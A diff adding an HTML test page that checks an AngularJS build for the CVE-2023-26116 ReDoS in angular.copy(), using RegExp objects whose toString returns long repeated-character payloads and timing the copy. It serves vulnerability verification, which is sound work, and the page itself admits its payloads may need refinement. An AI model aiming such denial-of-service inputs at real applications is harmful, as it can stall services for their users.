@@ -1,0 +1,182 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>CVE-2023-26116 ReDoS Test</title>
+    <script src="build/angular.js"></script>
+</head>
+<body ng-app="testApp" ng-controller="TestController">
+    <h2>CVE-2023-26116 ReDoS Vulnerability Test</h2>
+    
+    <div id="test-results">
+        <p><strong>Testing angular.copy() ReDoS vulnerability...</strong></p>
+        <div id="vulnerability-status">Testing in progress...</div>
+        
+        <h3>Test Results:</h3>
+        <div id="test-output"></div>
+        
+        <h3>Performance Results:</h3>
+        <div id="performance-output"></div>
+    </div>
+
+    <script>
+        angular.module('testApp', [])
+        .controller('TestController', ['$scope', function($scope) {
+            
+            function log(message) {
+                var output = document.getElementById('test-output');
+                output.innerHTML += message + '<br>';
+                console.log(message);
+            }
+            
+            function logPerformance(test, duration) {
+                var perfOutput = document.getElementById('performance-output');
+                var status = duration > 100 ? '⚠️ SLOW' : '✅ FAST';
+                var message = test + ': ' + duration.toFixed(2) + 'ms ' + status;
+                perfOutput.innerHTML += message + '<br>';
+                console.log(message);
+            }
+            
+            // Test CVE-2023-26116
+            function testCVE202326116() {
+                log('=== CVE-2023-26116 ReDoS Test ===');
+                
+                var vulnerabilityFound = false;
+                
+                // Test 1: Create a RegExp with malicious toString
+                log('Test 1: Basic ReDoS pattern...');
+                
+                try {
+                    var maliciousRegex = new RegExp('test');
+                    
+                    // Override toString to return problematic input
+                    maliciousRegex.toString = function() {
+                        return '/test/' + 'a'.repeat(10000);
+                    };
+                    
+                    var start = performance.now();
+                    var copied = angular.copy(maliciousRegex);
+                    var duration = performance.now() - start;
+                    
+                    logPerformance('Basic ReDoS test', duration);
+                    
+                    if (duration > 50) {
+                        log('⚠️ Potential ReDoS detected in Test 1');
+                        vulnerabilityFound = true;
+                    }
+                } catch (error) {
+                    log('Test 1 error: ' + error.message);
+                }
+                
+                // Test 2: More aggressive attack pattern
+                log('Test 2: Aggressive ReDoS pattern...');
+                
+                try {
+                    var maliciousRegex2 = new RegExp('vuln', 'gi');
+                    
+                    // Create input that should trigger catastrophic backtracking
+                    // in the vulnerable regex /[^/]*$/
+                    maliciousRegex2.toString = function() {
+                        // Pattern that makes /[^/]*$/ struggle
+                        var base = '/vulnerable/flags';
+                        var payload = 'x'.repeat(50000) + 'y';
+                        return base + payload;
+                    };
+                    
+                    var start = performance.now();
+                    var copied = angular.copy(maliciousRegex2);
+                    var duration = performance.now() - start;
+                    
+                    logPerformance('Aggressive ReDoS test', duration);
+                    
+                    if (duration > 100) {
+                        log('🚨 ReDoS vulnerability CONFIRMED in Test 2');
+                        vulnerabilityFound = true;
+                    }
+                } catch (error) {
+                    log('Test 2 error: ' + error.message);
+                }
+                
+                // Test 3: Different attack vector
+                log('Test 3: Alternative ReDoS pattern...');
+                
+                try {
+                    var maliciousRegex3 = new RegExp('pattern');
+                    
+                    // Try a different approach that might trigger the vulnerability
+                    maliciousRegex3.toString = function() {
+                        // Create a string that ends with many non-slash characters
+                        return '/pattern/g' + 'z'.repeat(20000);
+                    };
+                    
+                    var start = performance.now();
+                    var copied = angular.copy(maliciousRegex3);
+                    var duration = performance.now() - start;
+                    
+                    logPerformance('Alternative ReDoS test', duration);
+                    
+                    if (duration > 75) {
+                        log('⚠️ Potential ReDoS detected in Test 3');
+                        vulnerabilityFound = true;
+                    }
+                } catch (error) {
+                    log('Test 3 error: ' + error.message);
+                }
+                
+                // Test 4: Nested object copy with malicious regex
+                log('Test 4: Nested object with malicious RegExp...');
+                
+                try {
+                    var maliciousRegex4 = new RegExp('nested');
+                    maliciousRegex4.toString = function() {
+                        return '/nested/flags' + 'a'.repeat(30000) + 'b';
+                    };
+                    
+                    var objectWithRegex = {
+                        name: 'test',
+                        pattern: maliciousRegex4,
+                        data: [1, 2, 3]
+                    };
+                    
+                    var start = performance.now();
+                    var copiedObject = angular.copy(objectWithRegex);
+                    var duration = performance.now() - start;
+                    
+                    logPerformance('Nested object ReDoS test', duration);
+                    
+                    if (duration > 100) {
+                        log('🚨 ReDoS vulnerability found in nested object copy');
+                        vulnerabilityFound = true;
+                    }
+                } catch (error) {
+                    log('Test 4 error: ' + error.message);
+                }
+                
+                // Summary
+                log('=== Test Summary ===');
+                var statusElement = document.getElementById('vulnerability-status');
+                
+                if (vulnerabilityFound) {
+                    log('🚨 CVE-2023-26116 VULNERABILITY CONFIRMED');
+                    log('The angular.copy() function is vulnerable to ReDoS attacks');
+                    log('Vulnerable component: copyType function processing RegExp objects');
+                    statusElement.innerHTML = '<strong style="color: red;">VULNERABLE - CVE-2023-26116 ReDoS confirmed</strong>';
+                    statusElement.style.backgroundColor = '#ffebee';
+                    statusElement.style.padding = '10px';
+                    statusElement.style.border = '1px solid #f44336';
+                } else {
+                    log('ℹ️ Vulnerability not clearly demonstrated');
+                    log('This could indicate the attack payloads need refinement');
+                    log('or the vulnerability is harder to trigger in this environment');
+                    statusElement.innerHTML = '<strong style="color: orange;">INCONCLUSIVE - Vulnerability not clearly demonstrated</strong>';
+                    statusElement.style.backgroundColor = '#fff3e0';
+                    statusElement.style.padding = '10px';
+                    statusElement.style.border = '1px solid #ff9800';
+                }
+            }
+            
+            // Run the test after a short delay to ensure DOM is ready
+            setTimeout(testCVE202326116, 1000);
+        }]);
+    </script>
+</body>
+</html>
